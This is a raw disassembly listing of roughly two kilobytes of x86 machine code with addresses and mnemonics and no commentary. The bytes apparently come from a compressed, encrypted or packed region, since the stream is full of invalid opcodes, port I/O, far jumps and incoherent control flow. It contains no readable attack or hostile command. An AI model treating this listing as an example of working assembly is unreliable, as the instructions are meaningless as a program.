  408ffe:	lds    ecx,FWORD PTR [esi]
  409000:	and    eax,0xd7e65f67
  409005:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409006:	dec    edx
  409007:	push   esp
  409008:	jmp    0x408fcf
  40900a:	jecxz  0x409085
  40900c:	xor    DWORD PTR [edi+0x13],eax
  40900f:	push   edi
  409010:	in     al,dx
  409011:	imul   ecx,DWORD PTR [eax],0x31737b99
  409017:	inc    ebx
  409018:	add    ebx,eax
  40901a:	sub    ch,dl
  40901c:	sub    ebx,DWORD PTR [edi+0x3643542c]
  409022:	or     BYTE PTR [ebx+ebx*4-0x437e659f],dh
  409029:	jns    0x408fd2
  40902b:	ret    0x14f6
  40902e:	(bad)  
  40902f:	mov    al,0xb9
  409031:	and    DWORD PTR [ebx],0x1b
  409034:	sub    BYTE PTR [ebx-0x19],dh
  409037:	fs dec ebp
  409039:	mov    eax,ds:0xfc6d794c
  40903e:	adc    DWORD PTR [ebx-0x34],esi
  409041:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409042:	jge    0x408ff1
  409044:	in     al,0xbd
  409046:	ins    BYTE PTR es:[edi],dx
  409047:	jns    0x40909f
  409049:	lods   eax,DWORD PTR ds:[esi]
  40904a:	in     eax,0x8
  40904c:	jmp    0x40907c
  40904e:	ret    
  40904f:	xor    bl,BYTE PTR [eax+0x4af5c99d]
  409055:	(bad)  
  409057:	lods   al,BYTE PTR ds:[esi]
  409058:	mov    WORD PTR [eax+0x6],?
  40905b:	mov    ds:0xe419e5b5,al
  409060:	sbb    edx,DWORD PTR [eax]
  409062:	pushf  
  409063:	xchg   ebx,eax
  409064:	dec    ebp
  409065:	xchg   ecx,eax
  409066:	sub    eax,0xe8ecb69a
  40906b:	adc    BYTE PTR [esi],dh
  40906d:	lahf   
  40906e:	or     BYTE PTR [ebx],dl
  409070:	mov    al,ds:0xc5e94847
  409075:	leave  
  409076:	jns    0x4090dc
  409078:	push   0xffffffd7
  40907a:	dec    edx
  40907b:	add    al,0x6f
  40907d:	test   DWORD PTR [ecx],edi
  40907f:	stc    
  409080:	popa   
  409081:	sbb    DWORD PTR [ecx],edi
  409083:	jle    0x409088
  409085:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409086:	or     DWORD PTR [eax],0xffffffa7
  409089:	cwde   
  40908a:	and    bh,ch
  40908c:	and    ebp,0x65e035a7
  409092:	push   edi
  409093:	and    edx,DWORD PTR [ecx+0x731627b8]
  409099:	ror    dh,cl
  40909b:	daa    
  40909c:	rol    DWORD PTR [esi+ebp*8-0xc0b5ae2],cl
  4090a3:	dec    ebp
  4090a4:	or     eax,DWORD PTR [ecx+ebp*4+0x24]
  4090a8:	popf   
  4090a9:	scas   al,BYTE PTR es:[edi]
  4090aa:	inc    edi
  4090ab:	rcl    DWORD PTR [edx-0x5e],0x18
  4090af:	inc    esp
  4090b0:	sbb    eax,0x50be0953
  4090b5:	cmc    
  4090b6:	cdq    
  4090b7:	loop   0x4090fc
  4090b9:	add    BYTE PTR [edi+0x342f52a7],bh
  4090bf:	jbe    0x4090db
  4090c1:	inc    ebp
  4090c2:	add    al,BYTE PTR [ecx+0x5f68b751]
  4090c8:	shr    BYTE PTR [edi],cl
  4090ca:	xchg   edx,eax
  4090cb:	xchg   DWORD PTR [esi+0x2e2abd54],ebx
  4090d1:	aas    
  4090d2:	add    edi,DWORD PTR [eax+0xb]
  4090d5:	loop   0x4090ed
  4090d7:	xchg   ebp,eax
  4090d8:	arpl   WORD PTR [ebp-0x61],dx
  4090db:	add    al,BYTE PTR [esi]
  4090dd:	inc    ebx
  4090de:	sbb    bh,BYTE PTR [esi+0x6]
  4090e1:	pop    ebx
  4090e2:	retf   
  4090e3:	mov    bl,0xbb
  4090e5:	xor    cl,BYTE PTR [ecx-0x21cc5cf7]
  4090eb:	push   es
  4090ec:	jle    0x409071
  4090ee:	hlt    
  4090ef:	jmp    0x409167
  4090f1:	stos   DWORD PTR es:[edi],eax
  4090f2:	rep lods eax,DWORD PTR ds:[esi]
  4090f4:	stos   DWORD PTR es:[edi],eax
  4090f5:	dec    ebx
  4090f7:	(bad)  
  4090f8:	push   ds
  4090f9:	gs test al,0x37
  4090fc:	jle    0x4090fb
  4090fe:	pop    esi
  4090ff:	xchg   edi,eax
  409100:	mov    dl,0x22
  409102:	pop    ss
  409103:	(bad)  
  409104:	sbb    eax,0x371546a7
  409109:	dec    ecx
  40910a:	outs   dx,DWORD PTR ds:[esi]
  40910b:	and    BYTE PTR [esi+eiz*1-0x3dd7e45e],ah
  409112:	add    DWORD PTR ds:0x87d53e2e,0x97b62f14
  40911c:	inc    edx
  40911d:	(bad)  
  40911e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40911f:	inc    ebx
  409120:	and    ch,dl
  409122:	call   0x297358f9
  409127:	jno    0x40911c
  409129:	mov    eax,0x88fcaff5
  40912e:	dec    edi
  40912f:	inc    esi
  409130:	push   edx
  409131:	push   ecx
  409132:	mov    eax,0x9c21bd84
  409137:	sub    edx,edx
  409139:	add    eax,0x425c364e
  40913e:	add    al,0x72
  409140:	pop    ss
  409141:	adc    ah,BYTE PTR [ebp-0x73]
  409144:	clc    
  409145:	fild   WORD PTR [ecx-0x54]
  409148:	or     BYTE PTR [eax-0x1e],al
  40914b:	pop    ebx
  40914c:	adc    edx,DWORD PTR [eax]
  40914e:	retf   0x289
  409151:	nop
  409152:	pop    ebx
  409153:	sbb    esi,DWORD PTR [edi-0x3]
  409156:	add    al,0xb8
  409158:	sbb    al,0x34
  40915a:	pushf  
  40915b:	add    BYTE PTR [edi+0x164100bf],dh
  409161:	(bad)  
  409162:	dec    edi
  409163:	xchg   esi,eax
  409164:	sbb    eax,0x6d
  409167:	push   ss
  409168:	xor    DWORD PTR [esp+eiz*8-0x179d7e01],0x24
  409170:	enter  0x8e9d,0xaf
  409174:	lea    edi,[ecx-0x4]
  409177:	pusha  
  409178:	jne    0x4091be
  40917a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40917b:	cdq    
  40917c:	mov    cl,0x21
  40917e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40917f:	xor    eax,0xb5b1199e
  409184:	xchg   ebp,eax
  409185:	cmp    al,0x4
  409187:	clc    
  409188:	repnz add eax,0x1c00df47
  40918e:	shl    BYTE PTR [edi-0x3a],1
  409191:	mov    edx,0xa2c75092
  409196:	sbb    edx,DWORD PTR [ebx-0x3c]
  409199:	pop    ebp
  40919a:	pop    es
  40919b:	jmp    0xe703ade1
  4091a0:	outs   dx,DWORD PTR ds:[esi]
  4091a1:	cli    
  4091a2:	sar    BYTE PTR [edi-0x65],0xa8
  4091a6:	push   es
  4091a7:	rol    BYTE PTR [ebx-0x79],cl
  4091aa:	loop   0x40916e
  4091ac:	in     al,dx
  4091ad:	dec    ebp
  4091ae:	popa   
  4091af:	xchg   edx,eax
  4091b0:	jmp    0x409213
  4091b2:	ror    al,0xb
  4091b5:	mov    bl,0xc8
  4091b7:	ins    DWORD PTR es:[edi],dx
  4091b8:	int3   
  4091b9:	mov    dl,0xac
  4091bb:	push   ds
  4091bc:	xchg   edx,eax
  4091bd:	mul    BYTE PTR [esi+0x2f]
  4091c0:	in     al,dx
  4091c1:	dec    esp
  4091c2:	aam    0xcb
  4091c4:	push   0xffffffa8
  4091c6:	shl    DWORD PTR [edx-0x3c],cl
  4091c9:	outs   dx,DWORD PTR ds:[esi]
  4091ca:	jg     0x4091f6
  4091cc:	aas    
  4091cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091ce:	jo     0x4091df
  4091d0:	lahf   
  4091d1:	scas   eax,DWORD PTR es:[edi]
  4091d2:	popf   
  4091d3:	imul   esp,DWORD PTR [ebp-0x31883b5a],0x9d2fd85b
  4091dd:	jae    0x409170
  4091df:	lea    esp,[edx]
  4091e1:	rcr    BYTE PTR [edx-0x2a],cl
  4091e4:	aad    0xbc
  4091e6:	cmc    
  4091e7:	pusha  
  4091e8:	jb     0x409234
  4091ea:	sub    BYTE PTR [eax],bh
  4091ec:	push   0xa8d45b67
  4091f1:	test   DWORD PTR [edi-0x21],esp
  4091f4:	ret    0xe56e
  4091f7:	jp     0x4091d7
  4091f9:	je     0x409270
  4091fb:	push   esi
  4091fc:	and    BYTE PTR es:[ebp+0x32],ch
  409200:	inc    BYTE PTR [edx+0x6]
  409203:	pop    edx
  409204:	jecxz  0x4091c9
  409206:	cwde   
  409207:	je     0x4091ca
  409209:	jno    0x409273
  40920b:	jno    0x409194
  40920d:	and    edx,DWORD PTR [esi+0x47]
  409210:	xor    DWORD PTR [edx-0x7f],ecx
  409213:	inc    edx
  409214:	imul   edx,DWORD PTR [edi],0x41
  409217:	xchg   edx,eax
  409218:	sbb    DWORD PTR [edx+eiz*2-0x42],esp
  40921c:	mov    ebp,0xbb9f4b1
  409221:	jmp    0x5339eb61
  409226:	bsf    esi,DWORD PTR [edx+eax*4]
  40922a:	aaa    
  40922b:	ss loop 0x4092a5
  40922e:	mov    al,ds:0xc21a8391
  409233:	sbb    BYTE PTR [ebx-0xa],0x64
  409237:	jl     0x40926f
  409239:	jmp    0xf37679cf
  40923e:	mov    bh,0x1c
  409240:	je     0x4091d5
  409242:	add    al,0xf3
  409244:	cmp    dl,BYTE PTR [edi-0xe522e30]
  40924a:	sub    al,0xb2
  40924c:	das    
  40924d:	cmp    al,0x31
  40924f:	rcl    DWORD PTR [ecx-0x2447021b],cl
  409255:	push   edx
  409256:	xchg   al,dh
  409258:	push   es
  409259:	mov    bh,cl
  40925b:	fwait
  40925c:	xor    BYTE PTR [eax+0x6e2e4137],0x4a
  409263:	inc    edi
  409264:	inc    eax
  409265:	test   al,0x26
  409267:	push   ebp
  409268:	push   ss
  409269:	sbb    edi,0x53
  40926c:	loop   0x40927d
  40926e:	outs   dx,DWORD PTR ds:[esi]
  40926f:	fiadd  WORD PTR [eax+0x14]
  409272:	lahf   
  409273:	jns    0x409206
  409275:	dec    edx
  409276:	call   0x669b18ce
  40927b:	push   es
  40927c:	or     eax,0x917c1338
  409281:	mov    ds:0xd8296efd,al
  409286:	inc    esi
  409287:	jmp    FWORD PTR [ebx-0x3e]
  40928a:	cwde   
  40928b:	mov    bh,0x70
  40928d:	clc    
  40928e:	dec    edi
  40928f:	xor    DWORD PTR [edi+0x4],0x58b2bb55
  409296:	jbe    0x4092be
  409298:	scas   al,BYTE PTR es:[edi]
  409299:	retfw  
  40929b:	cmp    BYTE PTR [ebx-0x6b992ea4],0x9f
  4092a2:	sbb    ch,BYTE PTR [ebx]
  4092a4:	push   edi
  4092a5:	mov    ecx,0xb330df58
  4092aa:	shl    ecx,1
  4092ac:	xchg   edi,eax
  4092ad:	mov    DWORD PTR [edx+0x69562013],ecx
  4092b3:	push   cs
  4092b4:	push   esp
  4092b5:	stc    
  4092b6:	aam    0x46
  4092b8:	pushf  
  4092b9:	or     eax,0x18173670
  4092be:	cli    
  4092bf:	push   ecx
  4092c0:	inc    esi
  4092c1:	inc    edx
  4092c2:	out    0x24,al
  4092c4:	cbw    
  4092c6:	or     al,0x83
  4092c8:	pop    eax
  4092c9:	into   
  4092ca:	ss (bad) 
  4092cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092cd:	cmc    
  4092ce:	jnp    0x40930b
  4092d0:	adc    BYTE PTR [edi],al
  4092d2:	xor    eax,0x51579d69
  4092d7:	push   esi
  4092d8:	inc    ecx
  4092d9:	mov    esp,0x8a29004a
  4092de:	or     DWORD PTR [esi+0x70],esp
  4092e1:	loopne 0x40928e
  4092e3:	mov    al,0x3
  4092e5:	ss out dx,al
  4092e7:	stc    
  4092e8:	je     0x409305
  4092ea:	(bad)  
  4092eb:	jmp    0x8251:0xa4bc862f
  4092f2:	je     0x40929c
  4092f4:	test   DWORD PTR [edx+0x2a],ebx
  4092f7:	push   edx
  4092f8:	jl     0x4092ba
  4092fa:	pusha  
  4092fb:	dec    BYTE PTR [edi+0x4c]
  4092fe:	adc    BYTE PTR [ebp-0x7a],dh
  409301:	das    
  409302:	stos   DWORD PTR es:[edi],eax
  409303:	push   edi
  409304:	ja     0x40928e
  409306:	xor    BYTE PTR [ecx],0x9b
  409309:	cmp    edx,ebx
  40930b:	sbb    eax,0x6d1a2af6
  409310:	in     eax,0x34
  409312:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409313:	(bad)  
  409314:	mov    ch,0x35
  409316:	mov    ch,0xcc
  409318:	and    ch,BYTE PTR [ecx+0x1]
  40931b:	mov    al,0x20
  40931d:	popa   
  40931e:	test   DWORD PTR [ecx-0x74],ecx
  409321:	ja     0x409397
  409323:	rol    esp,0xef
  409326:	ret    0xfa61
  409329:	lea    esp,[esi]
  40932b:	push   esp
  40932c:	adc    ah,dl
  40932e:	xor    eax,0x9f2ac10
  409333:	repnz push ebx
  409335:	cli    
  409336:	adc    dh,BYTE PTR [esi+eiz*4+0x37]
  40933a:	mov    ebx,0xfa438
  40933f:	pop    ebx
  409340:	aad    0xeb
  409342:	in     al,0x65
  409344:	arpl   WORD PTR [esi+0x590fe89e],bx
  40934a:	fcmove st,st(0)
  40934c:	pushf  
  40934d:	mov    bl,ch
  40934f:	mov    ecx,0x3d4fe00d
  409354:	xchg   ebx,eax
  409355:	sub    ebx,DWORD PTR [edi]
  409357:	push   eax
  409358:	dec    edi
  409359:	dec    ebp
  40935a:	cdq    
  40935b:	fisttp QWORD PTR [edi-0x3f]
  40935e:	mov    dl,0x17
  409360:	jp     0x4093bc
  409362:	lds    edi,FWORD PTR ds:0x77570838
  409368:	inc    esp
  409369:	pusha  
  40936a:	push   ecx
  40936b:	hlt    
  40936c:	hlt    
  40936d:	arpl   WORD PTR [esi-0x3c],dx
  409370:	mov    ecx,0x4bd2bf5b
  409375:	retf   
  409376:	pop    esp
  409377:	cs pop ds
  409379:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40937a:	cmp    DWORD PTR [edi+0xa],ebx
  40937d:	and    eax,0xe5e600b1
  409382:	and    al,ah
  409384:	xor    al,0xc2
  409386:	mov    eax,0xf2316e1c
  40938b:	dec    esp
  40938c:	mov    ds:0xab8d51a,al
  409391:	mov    cl,0x43
  409393:	adc    bl,BYTE PTR [edx]
  409395:	hlt    
  409396:	pop    es
  409397:	jl     0x409376
  409399:	jp     0x409320
  40939b:	dec    ecx
  40939c:	or     ebx,esp
  40939e:	jb     0x409357
  4093a0:	stos   DWORD PTR es:[edi],eax
  4093a1:	xchg   BYTE PTR [ecx-0x30],dl
  4093a4:	jmp    0x741e:0x4e05d239
  4093ab:	push   DWORD PTR [esi-0x49b3a09f]
  4093b1:	sbb    BYTE PTR [edx],bl
  4093b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093b4:	add    ch,BYTE PTR [eax-0xc]
  4093b7:	mov    ch,BYTE PTR [eax]
  4093b9:	jecxz  0x409436
  4093bb:	dec    esi
  4093bc:	pusha  
  4093bd:	pop    ecx
  4093be:	and    al,0xef
  4093c0:	out    0x9c,eax
  4093c2:	jmp    0x40934c
  4093c4:	push   esi
  4093c5:	jge    0x409364
  4093c7:	loope  0x40937f
  4093c9:	loop   0x40938f
  4093cb:	push   ebp
  4093cc:	push   es
  4093cd:	sub    eax,0xdece6065
  4093d2:	leave  
  4093d3:	push   edi
  4093d4:	in     eax,0xb9
  4093d6:	adc    al,0x18
  4093d8:	push   ebx
  4093d9:	adc    al,0x4d
  4093db:	stos   DWORD PTR es:[edi],eax
  4093dc:	ror    ch,cl
  4093de:	mov    edi,0xa724b2f3
  4093e3:	add    BYTE PTR [eax+eax*2],ah
  4093e6:	js     0x4093d0
  4093e8:	mov    cl,0xb1
  4093ea:	daa    
  4093eb:	xor    al,0x93
  4093ed:	jecxz  0x40945f
  4093ef:	ins    DWORD PTR es:[edi],dx
  4093f0:	mov    al,0x32
  4093f2:	xor    eax,0x4781de25
  4093f7:	(bad)  
  4093f8:	icebp  
  4093f9:	inc    ebx
  4093fa:	jns    0x409464
  4093fc:	mov    al,0xa8
  4093fe:	aas    
  4093ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409400:	outs   dx,BYTE PTR ds:[esi]
  409401:	jno    0x409410
  409403:	in     eax,0x67
  409405:	outs   dx,BYTE PTR ds:[esi]
  409406:	sbb    BYTE PTR [edx+0xb20ca9],ch
  40940c:	fdivr  QWORD PTR [ebx+ebx*1]
  40940f:	(bad)  
  409410:	cmp    ebx,esi
  409412:	xchg   BYTE PTR [edi+0x3ed14d86],cl
  409418:	jmp    0x4093f0
  40941a:	pop    es
  40941b:	sar    BYTE PTR [edx-0x3f4ea2b1],cl
  409421:	pop    edi
  409422:	ja     0x40940b
  409424:	(bad)  
  409426:	or     BYTE PTR [edi],0x76
  409429:	or     dl,BYTE PTR [esp+ecx*2-0x64]
  40942d:	out    dx,al
  40942e:	mov    ebp,0x1bb8ebb
  409433:	push   ebx
  409434:	mov    DWORD PTR [ecx],esi
  409436:	jge    0x409438
  409438:	out    0x9f,eax
  40943a:	aaa    
  40943b:	lods   eax,DWORD PTR ds:[esi]
  40943c:	test   al,0xf3
  40943e:	ret    
  40943f:	ret    
  409440:	or     esp,DWORD PTR fs:[esi]
  409443:	cmp    eax,0x1b29356a
  409448:	and    al,0x39
  40944a:	and    edi,DWORD PTR [edx]
  40944c:	and    al,0x3d
  40944e:	aad    0x24
  409450:	mov    esi,esp
  409452:	loopne 0x40943d
  409454:	mov    cl,BYTE PTR [edi+0x21]
  409457:	fisttp WORD PTR [esi]
  409459:	das    
  40945a:	js     0x4093de
  40945c:	sbb    eax,0x500b6828
  409461:	test   DWORD PTR [ecx],0x2f64b802
  409467:	outs   dx,BYTE PTR ds:[esi]
  409468:	pop    ebp
  409469:	mov    ebp,esi
  40946b:	(bad)  
  40946c:	aaa    
  40946d:	pop    esi
  40946e:	ins    DWORD PTR es:[edi],dx
  40946f:	mov    esp,0x3872103c
  409474:	jbe    0x409487
  409476:	jmp    0xd72f:0xbe3a38ec
  40947d:	xchg   ebp,eax
  40947e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40947f:	repz (bad) [esi+0x35]
  409483:	rol    BYTE PTR [ebp+0x5f],0x73
  409487:	les    eax,FWORD PTR [edi-0x6b]
  40948a:	xor    ecx,edx
  40948c:	add    eax,0xd71a76a0
  409491:	or     bh,cl
  409493:	mov    ecx,0x5a92a90c
  409498:	fadd   QWORD PTR [esi+eax*4]
  40949b:	sub    al,0x7b
  40949d:	daa    
  40949e:	into   
  40949f:	repz add al,0xcb
  4094a2:	(bad)  
  4094a3:	jl     0x409489
  4094a5:	jne    0x409506
  4094a7:	add    ebp,DWORD PTR ds:0xa87f3851
  4094ad:	popa   
  4094ae:	test   al,0x9e
  4094b0:	cld    
  4094b1:	into   
  4094b2:	mov    cl,0x90
  4094b4:	sub    al,0xa5
  4094b6:	xor    BYTE PTR ds:0x66c7711a,al
  4094bc:	adc    eax,0xd2b09fbf
  4094c1:	iret   
  4094c2:	sbb    BYTE PTR [ebp+0x642f88e2],bh
  4094c8:	mov    edx,0x57ec051f
  4094cd:	rcl    DWORD PTR [edi+0x1d],cl
  4094d0:	div    DWORD PTR [ebx+0x23]
  4094d3:	sub    DWORD PTR [edx-0x43c5571b],0x1a334f31
  4094dd:	stos   BYTE PTR es:[edi],al
  4094de:	push   esp
  4094df:	adc    edx,edi
  4094e1:	fdivr  QWORD PTR [ecx]
  4094e3:	mov    dl,0xe9
  4094e5:	in     eax,0x75
  4094e7:	add    esi,DWORD PTR [ecx]
  4094e9:	push   0x353d3a09
  4094ee:	sub    DWORD PTR [ecx+esi*2+0x1b507ab5],eax
  4094f5:	into   
  4094f6:	repz sub BYTE PTR [ebp-0x66],0x3f
  4094fb:	gs mov ebx,0xa3bc2df3
  409501:	mov    ds:0x448b7916,eax
  409506:	inc    esp
  409507:	daa    
  409508:	cmp    al,0xc6
  40950a:	(bad)  
  40950b:	ss nop
  40950d:	jge    0x4094d1
  40950f:	leave  
  409510:	ss and al,0xb0
  409513:	pop    edi
  409514:	rcl    BYTE PTR [eax-0x1e9bc3a1],1
  40951a:	lds    ebp,FWORD PTR [esi-0x71c2a20f]
  409520:	dec    edx
  409521:	cld    
  409522:	xchg   ebp,eax
  409523:	cmp    al,0xe0
  409525:	scas   al,BYTE PTR es:[edi]
  409526:	push   edi
  409527:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409528:	sbb    eax,0x888ebf79
  40952d:	xor    BYTE PTR [ecx+edi*8],cl
  409530:	xchg   DWORD PTR ds:0x61d270e6,ecx
  409536:	mov    dh,0x32
  409538:	sub    edi,edi
  40953a:	xchg   esp,ebx
  40953c:	ins    DWORD PTR es:[edi],dx
  40953d:	cmp    BYTE PTR [ebx+0x4e],dh
  409540:	mov    al,ds:0x434e42bb
  409545:	adc    esp,DWORD PTR [eax]
  409547:	add    eax,0x38d147e
  40954c:	ins    DWORD PTR es:[edi],dx
  40954d:	mov    bl,0x9e
  40954f:	scas   eax,DWORD PTR es:[edi]
  409550:	mov    al,0xfe
  409552:	cdq    
  409553:	je     0x40955b
  409555:	pop    edx
  409556:	adc    BYTE PTR [ebp-0x3189010a],0x21
  40955d:	retf   
  40955e:	sub    eax,0xeb26cccc
  409563:	jp     0x40954f
  409565:	fisttp DWORD PTR [ecx-0x5a7072d1]
  40956b:	dec    esi
  40956c:	and    ebx,DWORD PTR [ebp+0x42]
  40956f:	mov    ebx,0xe9074ce1
  409574:	not    DWORD PTR [ebx+0x6316a16f]
  40957a:	sub    esp,DWORD PTR [esi]
  40957c:	mov    BYTE PTR [edi-0x3b],al
  40957f:	mov    ds:0x41470bc9,eax
  409584:	mov    ch,0xe9
  409586:	or     DWORD PTR [ebp-0x305b97bc],ebp
  40958c:	into   
  40958d:	mov    DWORD PTR [esi+0x2f],ebx
  409590:	les    ecx,FWORD PTR [eax]
  409592:	bound  edx,QWORD PTR [esi+0x62]
  409595:	std    
  409596:	jl     0x409592
  409598:	inc    esi
  409599:	adc    BYTE PTR [ebp+ebx*8-0xf23a62e],bh
  4095a0:	push   cs
  4095a1:	fnstcw WORD PTR [edx]
  4095a3:	std    
  4095a4:	pop    ebp
  4095a5:	xor    bh,BYTE PTR [eax]
  4095a7:	cli    
  4095a8:	and    al,dh
  4095aa:	or     BYTE PTR [ebx-0x5d],bl
  4095ad:	out    dx,al
  4095ae:	fwait
  4095af:	jo     0x409575
  4095b1:	mov    eax,0xa7520d66
  4095b6:	rcr    BYTE PTR [esi],cl
  4095b8:	push   ebx
  4095b9:	push   esi
  4095ba:	push   ebp
  4095bb:	in     al,dx
  4095bc:	not    DWORD PTR ds:0x859fd769
  4095c2:	in     eax,dx
  4095c3:	xor    al,0x10
  4095c5:	jo     0x40961f
  4095c7:	add    BYTE PTR [edx-0x67],ch
  4095ca:	jecxz  0x409601
  4095cc:	dec    edx
  4095cd:	inc    esi
  4095ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095cf:	pop    es
  4095d0:	shl    BYTE PTR [ecx],1
  4095d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095d3:	hlt    
  4095d4:	push   ebp
  4095d5:	dec    edx
  4095d6:	inc    eax
  4095d7:	sub    ebx,DWORD PTR [esi]
  4095d9:	push   ebx
  4095da:	js     0x409653
  4095dc:	inc    DWORD PTR [edi]
  4095de:	fsubr  DWORD PTR [edi+0x7bb27316]
  4095e4:	adc    DWORD PTR [edx],eax
  4095e6:	scas   al,BYTE PTR es:[edi]
  4095e7:	inc    ebx
  4095e8:	jmp    0x51b10474
  4095ed:	in     al,0x22
  4095ef:	adc    al,0x76
  4095f1:	fdivrp st(5),st
  4095f3:	jg     0x4095d8
  4095f5:	out    0x1a,eax
  4095f7:	or     eax,0x57e838db
  4095fc:	retf   
  4095fd:	jne    0x4095e4
  4095ff:	and    eax,0x142f9e5a
  409604:	adc    BYTE PTR [ebx],al
  409606:	mov    eax,0x2bbb2f69
  40960b:	ja     0x4095f1
  40960d:	rcr    BYTE PTR [ecx*4-0x4f39354d],1
  409614:	out    dx,al
  409615:	scas   eax,DWORD PTR es:[edi]
  409616:	mov    ds:0xedb0cd2a,al
  40961b:	jbe    0x4095b5
  40961d:	out    dx,eax
  40961e:	xchg   BYTE PTR [esi-0x36],ch
  409621:	iret   
  409622:	mov    dh,0xc4
  409624:	jmp    0x819d:0xef19d8dd
  40962b:	cs pop es
  40962d:	push   es
  40962e:	adc    BYTE PTR [edi],ah
  409630:	(bad)  
  409631:	push   ss
  409632:	xchg   esp,eax
  409633:	test   DWORD PTR [edi],0xfc2fecf4
  409639:	rcr    DWORD PTR [edx+0x3043544f],0xfd
  409640:	xchg   ebx,eax
  409641:	or     BYTE PTR [edx-0x28e44133],dh
  409647:	loopne 0x40966d
  409649:	(bad)  
  40964a:	jb     0x409660
  40964c:	and    al,0xfd
  40964e:	ds aam 0x85
  409651:	pop    esi
  409652:	or     edi,edi
  409654:	sbb    esi,ecx
  409656:	xor    al,0x1c
  409658:	dec    ebx
  409659:	lea    edi,[ebx-0x56]
  40965c:	push   esi
  40965d:	jecxz  0x4095f2
  40965f:	fwait
  409660:	jg     0x409673
  409662:	rcl    BYTE PTR [edx+0x5a80f280],cl
  409668:	aas    
  409669:	add    al,0x70
  40966b:	mov    ebx,0xbab8ebbd
  409670:	xchg   edx,eax
  409671:	add    BYTE PTR [ebx-0x151db394],cl
  409677:	scas   al,BYTE PTR es:[edi]
  409678:	jl     0x4096b0
  40967a:	js     0x409644
  40967c:	ror    DWORD PTR [ebx],0xf3
  40967f:	sub    DWORD PTR [edx+ebx*1-0x10a76218],edx
  409686:	cmp    eax,0x544fd879
  40968b:	xchg   esi,eax
  40968c:	mov    cl,0x29
  40968e:	sti    
  40968f:	outs   dx,BYTE PTR ds:[esi]
  409690:	neg    BYTE PTR [esi]
  409692:	cs mov bh,0x76
  409695:	push   0x6755a2a4
  40969a:	add    edx,ebx
  40969c:	xlat   BYTE PTR ds:[ebx]
  40969d:	mov    ebx,0x5bb3e876
  4096a2:	addps  xmm2,XMMWORD PTR [ebx]
  4096a5:	cmp    esp,esp
  4096a7:	sub    eax,0x9267edfd
  4096ac:	lds    edx,FWORD PTR [eax+0x2c1761d0]
  4096b2:	lds    eax,FWORD PTR [ebp-0x37]
  4096b5:	adc    ecx,DWORD PTR [edi-0x7b5eb2ca]
  4096bb:	loopne 0x40965b
  4096bd:	inc    edx
  4096be:	ficom  WORD PTR ds:0xc14d2c2b
  4096c4:	inc    eax
  4096c5:	enter  0x774f,0x2e
  4096c9:	or     DWORD PTR [esi+0x10],esp
  4096cc:	or     DWORD PTR [ebx+0x1436d14b],ebx
  4096d2:	jns    0x409718
  4096d4:	scas   eax,DWORD PTR es:[edi]
  4096d5:	dec    esp
  4096d6:	mov    edx,esp
  4096d8:	je     0x409692
  4096da:	sub    eax,0xce707163
  4096df:	ret    0x32d7
  4096e2:	dec    eax
  4096e3:	popa   
  4096e4:	icebp  
  4096e5:	jo     0x4096cc
  4096e7:	bound  edi,QWORD PTR [ebx-0x61]
  4096ea:	inc    ecx
  4096eb:	jne    0x40975c
  4096ed:	sub    esp,DWORD PTR [ecx]
  4096ef:	jp     0x4096df
  4096f1:	cmp    DWORD PTR ds:[ebx+0x4ee293c3],esp
  4096f8:	leave  
  4096f9:	neg    DWORD PTR ds:0xdc029142
  4096ff:	outs   dx,DWORD PTR ds:[esi]
  409700:	sbb    bl,BYTE PTR [edi-0x4ac31551]
  409706:	sub    eax,0x6d03e95a
  40970b:	add    DWORD PTR [ebx],eax
  40970d:	xchg   esp,eax
  40970e:	rol    DWORD PTR ss:[ebp-0x6f91e301],1
  409715:	dec    esi
  409716:	sub    ecx,DWORD PTR [edi+0x25b0b295]
  40971c:	inc    esp
  40971d:	push   ebx
  40971e:	loopne 0x40973e
  409720:	xchg   edi,eax
  409721:	daa    
  409722:	test   DWORD PTR [ebp+0x789e8ce9],0x8044d6b1
  40972c:	shl    BYTE PTR ds:0x2e50dcda,0x4e
  409733:	mov    edi,0xc2e3cb7b
  409738:	hlt    
  409739:	and    eax,edx
  40973b:	mov    BYTE PTR [esi],cl
  40973d:	test   al,0x94
  40973f:	stc    
  409740:	jle    0x409793
  409742:	pop    ecx
  409743:	cld    
  409744:	mov    eax,ds:0x55cd75bd
  409749:	adc    edi,eax
  40974b:	lods   al,BYTE PTR ds:[esi]
  40974c:	adc    eax,0x32ca4250
  409751:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409752:	add    DWORD PTR [eax-0x6e],eax
  409755:	outs   dx,BYTE PTR ds:[esi]
  409756:	xchg   esi,eax
  409757:	ins    DWORD PTR es:[edi],dx
  409758:	adc    bl,BYTE PTR [ebx]
  40975a:	jp     0x4097d6
  40975c:	data16 add ah,al
  40975f:	(bad)  
  409760:	in     eax,0xb8
  409762:	(bad)  
  409763:	test   eax,0x4eac649f
  409768:	xchg   esi,eax
  409769:	arpl   WORD PTR fs:[esi+0x27c2e002],dx
  409770:	into   
  409771:	pop    ebp
  409772:	fmul   st(7),st
  409774:	je     0x40972f
  409776:	inc    esp
  409777:	ret    
  409778:	cli    
  409779:	adc    al,bl
  40977b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40977c:	mov    ebp,0xf2d3031e
  409781:	jl     0x4097f6
  409783:	xchg   esp,eax
  409784:	xor    cl,ch
  409786:	mov    ah,0xf3
  409788:	and    eax,0x307719b7
  40978d:	xchg   DWORD PTR [edi-0x57],ebp
  409790:	aas    
  409791:	jnp    0x409718
  409793:	mov    ch,0x61
  409795:	xor    eax,0xba700672
